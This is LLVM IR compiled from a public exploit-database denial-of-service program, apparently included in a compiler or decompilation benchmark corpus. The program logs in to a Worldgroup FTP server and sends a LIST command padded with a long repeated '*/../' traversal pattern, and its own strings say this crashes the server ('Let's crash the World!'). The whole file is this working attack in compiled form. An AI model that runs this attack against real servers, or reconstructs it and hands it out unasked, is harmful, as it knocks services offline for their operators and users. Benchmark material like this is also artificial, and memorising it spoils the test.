; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21305.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21305.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i8* }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@__const.main.cr = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str = private unnamed_addr constant [89 x i8] c"\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0A\0AThis program crash Worldgroup servers 3.xx for windows 95/98/ME/NT/2K.\00", align 1
@.str.1 = private unnamed_addr constant [66 x i8] c"\0A\0DGreets to [WhU]//[GiN]//[LByte]//[WGHACK] projects!\0A\0D  USAGE:\0A\0D\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"Ftp_dos.exe [HOST] [LOGIN] [PASSWORD] \00", align 1
@.str.3 = private unnamed_addr constant [67 x i8] c"\0A\0D example : fpt_dos.exe 127.0.0.1 anonymous anonymous@127.0.0.1 \0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"USER \00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"PASS \00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"PASV\00", align 1
@.str.7 = private unnamed_addr constant [127 x i8] c"LIST */../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../\0A\00", align 1
@.str.8 = private unnamed_addr constant [35 x i8] c"Unable to initialize WinSock lib.\0A\00", align 1
@.str.9 = private unnamed_addr constant [25 x i8] c"Let's crash the World!\0A\0D\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"Coded by the [eaSt]:\0A\0D\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"\0AConnecting %s on port 21...\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@INADDR_NONE = common dso_local global i8* null, align 8
@.str.12 = private unnamed_addr constant [6 x i8] c"<< %s\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c">> %s %s\0A<< %s\00", align 1
@.str.14 = private unnamed_addr constant [12 x i8] c">> %s\0A<< %s\00", align 1
@.str.15 = private unnamed_addr constant [21 x i8] c"Try reconnect to %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca [1024 x i8], align 16
  %10 = alloca [6 x i8*], align 16
  %11 = alloca i32, align 4
  %12 = alloca [2 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [2 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %13, i8* align 1 getelementptr inbounds ([2 x i8], [2 x i8]* @__const.main.cr, i32 0, i32 0), i64 2, i1 false)
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 3
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.1, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i64 0, i64 0))
  %21 = call i32 @exit(i32 1) #4
  unreachable

22:                                               ; preds = %2
  %23 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 0
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i8** %23, align 16
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 1
  store i8* %26, i8** %27, align 8
  %28 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 2
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i8** %28, align 16
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 3
  %31 = load i8*, i8** %30, align 8
  %32 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 3
  store i8* %31, i8** %32, align 8
  %33 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8** %33, align 16
  %34 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 5
  store i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str.7, i64 0, i64 0), i8** %34, align 8
  %35 = call i64 @WSAStartup(i32 257, i32* %11)
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %40

37:                                               ; preds = %22
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.8, i64 0, i64 0))
  %39 = call i32 @exit(i32 1) #4
  unreachable

40:                                               ; preds = %22
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0))
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i64 0, i64 0), i8* %45)
  %47 = load i32, i32* @AF_INET, align 4
  %48 = load i32, i32* @SOCK_STREAM, align 4
  %49 = call i32 @socket(i32 %47, i32 %48, i32 0)
  store i32 %49, i32* %6, align 4
  %50 = load i32, i32* @AF_INET, align 4
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %50, i32* %51, align 4
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i8* @inet_addr(i8* %54)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %57 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i32 0, i32 0
  store i8* %55, i8** %57, align 8
  %58 = call i32 @htons(i32 21)
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %58, i32* %59, align 8
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call %struct.hostent* @gethostbyname(i8* %62)
  store %struct.hostent* %63, %struct.hostent** %8, align 8
  %64 = icmp ne %struct.hostent* %63, null
  br i1 %64, label %65, label %75

65:                                               ; preds = %40
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %67 = bitcast %struct.TYPE_2__* %66 to i8*
  %68 = load %struct.hostent*, %struct.hostent** %8, align 8
  %69 = getelementptr inbounds %struct.hostent, %struct.hostent* %68, i32 0, i32 1
  %70 = load i32, i32* %69, align 4
  %71 = load %struct.hostent*, %struct.hostent** %8, align 8
  %72 = getelementptr inbounds %struct.hostent, %struct.hostent* %71, i32 0, i32 0
  %73 = load i32, i32* %72, align 4
  %74 = call i32 @memcpy(i8* %67, i32 %70, i32 %73)
  br label %88

75:                                               ; preds = %40
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = call i8* @inet_addr(i8* %78)
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %81 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %80, i32 0, i32 0
  store i8* %79, i8** %81, align 8
  %82 = load i8*, i8** @INADDR_NONE, align 8
  %83 = icmp eq i8* %79, %82
  br i1 %83, label %84, label %87

84:                                               ; preds = %75
  %85 = call i32 (...) @WSACleanup()
  %86 = call i32 @exit(i32 1) #4
  unreachable

87:                                               ; preds = %75
  br label %88

88:                                               ; preds = %87, %65
  %89 = load i32, i32* %6, align 4
  %90 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %91 = call i64 @connect(i32 %89, %struct.sockaddr* %90, i32 16)
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %93, label %96

93:                                               ; preds = %88
  %94 = call i32 (...) @WSACleanup()
  %95 = call i32 @exit(i32 1) #4
  unreachable

96:                                               ; preds = %88
  %97 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %98 = call i32 @memset(i8* %97, i32 0, i32 1024)
  %99 = load i32, i32* %6, align 4
  %100 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %101 = call i64 @recv(i32 %99, i8* %100, i32 1023, i32 0)
  %102 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 %101
  store i8 0, i8* %102, align 1
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i8* %103)
  %105 = load i32, i32* %6, align 4
  %106 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 0
  %107 = load i8*, i8** %106, align 16
  %108 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 0
  %109 = load i8*, i8** %108, align 16
  %110 = call i32 @strlen(i8* %109)
  %111 = call i32 @send(i32 %105, i8* %107, i32 %110, i32 0)
  %112 = load i32, i32* %6, align 4
  %113 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 1
  %114 = load i8*, i8** %113, align 8
  %115 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 1
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @strlen(i8* %116)
  %118 = call i32 @send(i32 %112, i8* %114, i32 %117, i32 0)
  %119 = load i32, i32* %6, align 4
  %120 = getelementptr inbounds [2 x i8], [2 x i8]* %12, i64 0, i64 0
  %121 = call i32 @send(i32 %119, i8* %120, i32 1, i32 0)
  %122 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %123 = call i32 @memset(i8* %122, i32 0, i32 1024)
  %124 = load i32, i32* %6, align 4
  %125 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %126 = call i64 @recv(i32 %124, i8* %125, i32 1023, i32 0)
  %127 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 %126
  store i8 0, i8* %127, align 1
  %128 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 0
  %129 = load i8*, i8** %128, align 16
  %130 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 1
  %131 = load i8*, i8** %130, align 8
  %132 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i8* %129, i8* %131, i8* %132)
  %134 = load i32, i32* %6, align 4
  %135 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 2
  %136 = load i8*, i8** %135, align 16
  %137 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 2
  %138 = load i8*, i8** %137, align 16
  %139 = call i32 @strlen(i8* %138)
  %140 = call i32 @send(i32 %134, i8* %136, i32 %139, i32 0)
  %141 = load i32, i32* %6, align 4
  %142 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 3
  %143 = load i8*, i8** %142, align 8
  %144 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 3
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @strlen(i8* %145)
  %147 = call i32 @send(i32 %141, i8* %143, i32 %146, i32 0)
  %148 = load i32, i32* %6, align 4
  %149 = getelementptr inbounds [2 x i8], [2 x i8]* %12, i64 0, i64 0
  %150 = call i32 @send(i32 %148, i8* %149, i32 1, i32 0)
  %151 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %152 = call i32 @memset(i8* %151, i32 0, i32 1024)
  %153 = load i32, i32* %6, align 4
  %154 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %155 = call i64 @recv(i32 %153, i8* %154, i32 1023, i32 0)
  %156 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 %155
  store i8 0, i8* %156, align 1
  %157 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 2
  %158 = load i8*, i8** %157, align 16
  %159 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 3
  %160 = load i8*, i8** %159, align 8
  %161 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %162 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i8* %158, i8* %160, i8* %161)
  %163 = load i32, i32* %6, align 4
  %164 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 4
  %165 = load i8*, i8** %164, align 16
  %166 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 4
  %167 = load i8*, i8** %166, align 16
  %168 = call i32 @strlen(i8* %167)
  %169 = call i32 @send(i32 %163, i8* %165, i32 %168, i32 0)
  %170 = load i32, i32* %6, align 4
  %171 = getelementptr inbounds [2 x i8], [2 x i8]* %12, i64 0, i64 0
  %172 = call i32 @send(i32 %170, i8* %171, i32 1, i32 0)
  %173 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %174 = call i32 @memset(i8* %173, i32 0, i32 1024)
  %175 = load i32, i32* %6, align 4
  %176 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %177 = call i64 @recv(i32 %175, i8* %176, i32 1023, i32 0)
  %178 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 %177
  store i8 0, i8* %178, align 1
  %179 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 4
  %180 = load i8*, i8** %179, align 16
  %181 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %182 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.14, i64 0, i64 0), i8* %180, i8* %181)
  %183 = load i32, i32* %6, align 4
  %184 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 5
  %185 = load i8*, i8** %184, align 8
  %186 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 5
  %187 = load i8*, i8** %186, align 8
  %188 = call i32 @strlen(i8* %187)
  %189 = call i32 @send(i32 %183, i8* %185, i32 %188, i32 0)
  %190 = load i32, i32* %6, align 4
  %191 = getelementptr inbounds [2 x i8], [2 x i8]* %12, i64 0, i64 0
  %192 = call i32 @send(i32 %190, i8* %191, i32 1, i32 0)
  %193 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %194 = call i32 @memset(i8* %193, i32 0, i32 1024)
  %195 = load i32, i32* %6, align 4
  %196 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %197 = call i64 @recv(i32 %195, i8* %196, i32 1023, i32 0)
  %198 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 %197
  store i8 0, i8* %198, align 1
  %199 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 5
  %200 = load i8*, i8** %199, align 8
  %201 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %202 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.14, i64 0, i64 0), i8* %200, i8* %201)
  %203 = load i8**, i8*** %5, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 1
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.15, i64 0, i64 0), i8* %205)
  %207 = call i32 (...) @WSACleanup()
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @WSAStartup(i32, i32*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i8* @inet_addr(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @WSACleanup(...) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i64 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
